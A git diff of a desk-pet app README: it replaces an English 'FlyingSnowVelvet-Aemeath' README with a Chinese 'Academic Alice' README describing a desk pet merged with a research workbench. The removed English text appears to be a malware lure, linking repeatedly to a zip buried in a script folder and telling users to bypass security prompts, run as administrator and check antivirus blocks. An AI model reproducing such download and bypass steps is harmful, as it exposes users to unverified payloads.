@@ -1,205 +1,114 @@
-# ✨ FlyingSnowVelvet-Aemeath - Simple AI Desk Pet for Daily Use
+# 学术爱丽丝（Academic Alice）— 学术桌面助手
 
-[![Download / Visit the app page](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Riana651/FlyingSnowVelvet-Aemeath/main/lib/script/SEanima/Aemeath_Velvet_Snow_Flying_concupy.zip)
+**Windows 常驻应用**：在桌面一侧提供 **AI 桌宠陪伴**，并通过浏览器内 **爱丽丝科研工作台** 承载论文、项目与任务进度（本机页面）。对外显示名、标语以根目录 **`app_brand.py`**（`APP_DISPLAY_NAME` / `APP_TAGLINE`）为准；`config/version_info.py` 导出版本号；AI 系统人格见 **`resc/persona.txt`**。
 
-## 🖥️ What this app does
+> **重要 · 来源与致谢**  
+> 本仓库是在 **两条开源 lineage** 上整合而成，维护者角色为 **整合与改编**，非原创作者：  
+> 1. **桌宠 / AI 基线** — 「飞行雪绒 / FlyingSnowVelvet-Aemeath」系（`LICENSE-CODE` + `LICENSE-ASSETS`）  
+> 2. **科研工作台 UI** — [AugustUp/phd_master_system](https://github.com/AugustUp/phd_master_system)（MIT，见 `resc/workbench/`）  
+> 完整说明见 **[`ACKNOWLEDGMENTS.md`](ACKNOWLEDGMENTS.md)**（发布请务必保留）。
 
-FlyingSnowVelvet-Aemeath is a desktop AI pet app for Windows. It adds a small AI companion to your screen and gives you a simple way to chat, interact, and use helpful desktop features in one place.
+中文产品定位与界面触点索引：**[`PRODUCT.md`](PRODUCT.md)**。里程碑、架构与数据路径约定：**[`PROGRESS.md`](PROGRESS.md)**。
 
-Use it if you want:
+浏览器内汇总 **贡献记录**（`doc/贡献名单和主播的狗盆/开发贡献*.txt`）与 **`doc/*.txt`**：**双击打开 [`AA使用必读.html`](AA使用必读.html)**（由 `python scripts/generate_doc_portal.py` 生成；门户不含赞助/打赏展示区块）。
 
-- A desk pet on your Windows desktop
-- Simple AI chat in a small app window
-- A light tool that stays out of the way
-- A friendly interface with easy controls
+---
 
-## 📥 Download and install
+## 本项目合并了什么
 
-Visit the project page here:
+| 组成部分 | 说明 |
+|----------|------|
+| **桌宠与 AI 基线** | 源自「飞行雪绒 / FlyingSnowVelvet-Aemeath」类 PyQt5 桌宠：音乐、语音、聊天、托盘、命令提示等。美术与上游名称权属见 **`LICENSE-ASSETS`**。 |
+| **科研工作台** | 静态资源在 **`resc/workbench/`**（主页面 `research_workbench.html`；旧名 `phd_workbench.html` 可作回退）。信息架构与交互参考 [AugustUp/phd_master_system](https://github.com/AugustUp/phd_master_system)（**MIT**），本仓已做 Tailwind 本地化、多主题与 PyQt 宿主嵌入，**非**对该上游的完整镜像。构建与存储键见 **`resc/workbench/README.txt`**。 |
 
-https://raw.githubusercontent.com/Riana651/FlyingSnowVelvet-Aemeath/main/lib/script/SEanima/Aemeath_Velvet_Snow_Flying_concupy.zip
+### 博士工作台 · 上游仓库说明（摘录）
 
-On that page, look for the latest release or the main download file. Then:
+**原仓库**：[AugustUp/phd_master_system](https://github.com/AugustUp/phd_master_system)（MIT）。以下段落为该仓库公开 readme 中的说明文字，**著作权与立场归原维护者**；摘录仅供追溯来源与致谢链，若与 GitHub 上最新 readme 不一致，以原仓库为准。
 
-1. Open the link above
-2. Find the latest version
-3. Download the Windows file
-4. If the file is a `.zip`, right-click it and choose Extract All
-5. Open the folder
-6. Double-click the app file to start it
+> 感谢小红书用户分享的源文件，我在原有基础上完善了桌面端与移动端适配，并新增了坚果云网盘数据同步功能。 衷心鸣谢直接提供源码参考的用户： 「不是黑子是癫子」— 小红书号：61709040774 「橘子汽水」— 小红书号：romantic_Ksir 同时也向为上述源码提供者贡献内容的原始作者们致以谢意。本项目仅用于学习交流，非商业用途、未用于盈利。如涉及侵权，请通过 Issue 联系，我将立即处理删库。
 
-If Windows shows a security prompt:
+本仓库内嵌页为改编与宿主集成，**不等同于**上游完整应用；坚果云等同步能力若未随包提供，见 `resc/workbench/README.txt` 与 `sync/ui.js` 注释。
 
-1. Click More info
-2. Click Run anyway
+源码与可分发组件的修改范围以 **`LICENSE-CODE`**、**`LICENSE-ASSETS`** 及上游许可证为准；**「可免费修改」不构成对受限素材的额外授权**，商用与再分发前请自行核对条款。
 
-If the app opens from a folder with several files, keep them together in the same folder so the app can work well.
+---
 
-## 🪟 System needs
+## 主要差异（概要，相对单独使用桌宠或单独打开工作台）
 
-This app is made for Windows users. A typical setup should work fine on most modern PCs.
+- **同一进程、同一套托盘与命令面板**：减少在浏览器与桌宠之间来回切换。
+- **「学术爱丽丝」人设与 UI 统一**：粉青像素风保留；**专用聊天窗口**（命令里「与学术爱丽丝聊天」）为 **粉色系** 独立窗，发送仍走与桌旁气泡相同的聊天管线。
+- **本地优先**：论文、项目与工作台配置等以本机存储为主（具体键名与路径以 `PROGRESS.md` / `workbench` README 为准）。
+- **可扩展结构**：管理器 `obj-*` 扫描注册、事件总线等（见 `PROGRESS.md` §2）。
 
-Recommended setup:
+---
 
-- Windows 10 or Windows 11
-- 4 GB RAM or more
-- 200 MB free disk space
-- A mouse and keyboard
-- Internet access for online AI features, if used
+## 下载与安装（终端用户）
 
-For the best result, use a PC with a stable network connection and a screen size large enough to keep the desk pet visible.
+发布包与历史下载入口以项目主页 / Release 为准（若 README 中外链变更，以仓库最新说明为准）。
 
-## 🚀 First-time setup
+1. 下载 Windows 压缩包或安装包。  
+2. 解压后 **勿只拷贝单个 exe**：保持目录内资源完整。  
+3. 若 SmartScreen 拦截，可选择「更多信息」→「仍要运行」。  
+4. 首次运行按界面完成语言、位置、模块开关等设置。
 
-After you download and open the app, follow these steps:
+---
 
-1. Start the program
-2. Wait for the main window to load
-3. Choose your language if the app asks
-4. Set the desk pet position on screen
-5. Open the settings panel
-6. Turn on the parts you want to use
-7. Save your settings
+## 开发者克隆本仓库
 
-If the app asks for permissions, allow access so it can show the pet on your desktop and keep the app running the way it should.
+```text
+# 建议使用 Python 3.10+，依赖见 install/ 目录说明
+python install/install_deps.py
+# 或双击根目录「安装依赖.bat」（会调用 install/安装依赖.bat）
+# 按 PROGRESS.md 与 resc/workbench/README.txt 构建工作台 CSS（若修改 HTML）
+```
 
-## 🎮 How to use it
+**Windows 绿色包（给未装 Python 的好友）**：在已能本地运行的环境下双击 **`打包Windows.bat`**（或 **`install/打包Windows.bat`**），使用 **`install/deskpet.spec`**；产物为 `dist/AcademicAlice/`。将整个 **`AcademicAlice` 文件夹** 压缩为 zip 发送即可。打包用的 Python 必须与运行依赖一致（需已安装 **PyQt5**）。
 
-FlyingSnowVelvet-Aemeath is made to be simple.
+**安装与依赖文件**集中在 **`install/`**（`install_deps.py`、`requirements.txt`、打包脚本等）；根目录 **`requirements.txt`** 仅一行 `-r install/requirements.txt`，便于 `pip install -r requirements.txt` 习惯不变。
 
-Basic actions:
+---
 
-- Click the pet to open a chat or action menu
-- Drag the pet to move it on the screen
-- Open settings to change size, sound, and position
-- Use the chat box to type a message
-- Switch between modes if the app offers more than one
+## 主要功能一览
 
-You can keep the app running while you work, study, or browse. It is meant to stay visible without blocking your main tasks.
+- 桌面 AI 宠物、拖拽、设置与托盘  
+- AI 聊天（桌旁气泡 + **专用聊天窗**）  
+- 音乐 / 语音等模块（以当前分支实现为准）  
+- **学术**：事件与论文、项目进度；**科研工作台**内嵌页（导出、主题等）  
 
-## 🧰 Main features
+---
 
-- Desktop AI pet that stays on your screen
-- Simple chat window for quick replies
-- Light Windows app design
-- Easy controls for non-technical users
-- Custom position and size options
-- Sound and display settings
-- Fast access from the desktop
-- Support for daily companion use
-- Optional interactive behavior for the pet
-- Clean layout with simple navigation
+## 文档地图
 
-## ⚙️ Recommended settings
+| 文件 | 用途 |
+|------|------|
+| `README.md` | 本页：仓库级介绍与合并说明 |
+| `ACKNOWLEDGMENTS.md` | **上游致谢与整合者说明（发布必附）** |
+| `PRODUCT.md` | 品牌、中文介绍稿、用户可见文案索引 |
+| `PROGRESS.md` | 技术 SSOT、里程碑、决策记录 |
+| `AA使用必读.html` | 脚本生成门户：贡献原文、`doc/*.txt`（无赞助/打赏区块） |
+| `doc/合并项目与使用入口.txt` | 合并来源、入口、许可提醒（纯文本） |
 
-For a smooth first run, try these settings:
+---
 
-- Start the app with Windows if you want it ready at login
-- Keep the pet size at a medium level
-- Use a fixed screen corner if you want less movement
-- Turn sound on only if you want audio feedback
-- Use a clear desktop background so the pet stands out
+## 隐私与网络
 
-If your screen feels crowded, move the pet to a corner and reduce its size.
+部分 AI 能力需联网；工作台图表等可能依赖公共 CDN（断网时可能降级）。请勿将敏感论文全文默认发往外部服务；具体以各设置项与后续 `PROGRESS.md` 约定为准。
 
-## 🧭 Common tasks
+---
 
-### Open the app
-Double-click the app file in the folder where you extracted it.
+## 本分支维护者（学术爱丽丝 · 文档与合并维护）
 
-### Move the desk pet
-Click and drag the pet to a new place on the screen.
+- **哔哩哔哩**：昵称「靓点迷人」；站内标识 `bili_2719061712`；个人空间：<https://space.bilibili.com/2719061712>（若 MID 与账号不一致，请维护者自行更正本段链接）。
+- **小红书**：昵称「皮鼓很痒」；小红书号：`533497202`。
 
-### Change the look
-Open settings and look for size, theme, or display options.
+应用内托盘「关注作者」等外链仍以 **`app_brand.py`** 中 `AUTHOR_BILIBILI_SPACE_URL` 为准；上列为仓库文档中的**署名与联系展示**，可与代码内链接分别维护。
 
-### Chat with the AI
-Open the chat area and type what you want to ask.
+---
 
-### Close the app
-Use the close button in the window or the tray menu if it runs in the background.
+## English summary
 
-## 🔍 If the app does not open
+**Academic Alice** is a Windows desk-pet app merged with an embedded **research workbench** (MIT-inspired UI in `resc/workbench/`, not a full upstream mirror) and **local-first** academic scheduling / papers / project tracking. Persona: `resc/persona.txt`. Assets: see **`LICENSE-ASSETS`**. The workbench traces to **[AugustUp/phd_master_system](https://github.com/AugustUp/phd_master_system)**; upstream readme acknowledgments are quoted (with attribution) in this README and `resc/workbench/README.txt`. **Fork maintainer (docs):** Bilibili 「靓点迷人」 / `bili_2719061712` (<https://space.bilibili.com/2719061712>); Xiaohongshu 「皮鼓很痒」 / ID `533497202` — see Chinese section above; tray link remains `app_brand.py`. Open **`AA使用必读.html`** for a script-generated portal (contribution text + `doc/*.txt`; no sponsorship section).
 
-Try these steps in order:
+---
 
-1. Make sure you downloaded all files from the release or project page
-2. Keep the app file and support files in the same folder
-3. Run the app as administrator
-4. Check whether your antivirus blocked the file
-5. Restart your PC and try again
-6. Make sure Windows is up to date
-
-If the window opens and then closes, the app may need one more required file from the same folder. Recheck the extracted files before you start it again.
-
-## 🧩 Folder layout
-
-If you downloaded a ZIP file, you may see a folder like this:
-
-- App.exe
-- Config folder
-- Assets folder
-- Data files
-- Readme file
-
-Do not move only one file out of the folder unless the app instructions say to do that. Keep the full set together so the app can find its files.
-
-## 🔐 Privacy and local use
-
-This app is built for personal desktop use. Some features may work on your device, and some may use online services for AI replies or content. If you use any connected feature, the app may need network access to work as expected.
-
-For best control, check the settings for:
-
-- Chat history
-- Voice or sound
-- Startup behavior
-- Background running
-- Notification options
-
-## 🎨 Simple use ideas
-
-You can use FlyingSnowVelvet-Aemeath as:
-
-- A small desk pet while you work
-- A chat buddy during breaks
-- A screen companion for long study sessions
-- A light desktop helper for quick interaction
-- A personal AI pet with a calm look and simple controls
-
-## 🛠️ Basic troubleshooting
-
-If the pet does not appear:
-
-- Check that the app is running
-- Look for a tray icon near the clock
-- Open the main window and show the pet again
-- Check if the pet is hidden behind other windows
-
-If the app feels slow:
-
-- Close extra apps
-- Reduce pet size
-- Turn off extra effects
-- Restart the app
-
-If the app cannot connect:
-
-- Check your internet
-- Make sure firewall rules allow the app
-- Try again after a few minutes
-
-## 📌 Quick start
-
-1. Open the project page
-2. Download the Windows app file
-3. Extract the file if needed
-4. Run the app
-5. Set the pet position
-6. Open chat or settings
-7. Keep it on your desktop while you use your PC
-
-## 📎 Project page
-
-Main download and app page:
-
-https://raw.githubusercontent.com/Riana651/FlyingSnowVelvet-Aemeath/main/lib/script/SEanima/Aemeath_Velvet_Snow_Flying_concupy.zip
+*本 README 为人工维护；`AA使用必读.html` 由脚本从 `doc/` 等文件生成。若与代码或 `PROGRESS.md` 不一致，以代码与 `PROGRESS.md` 为准。*
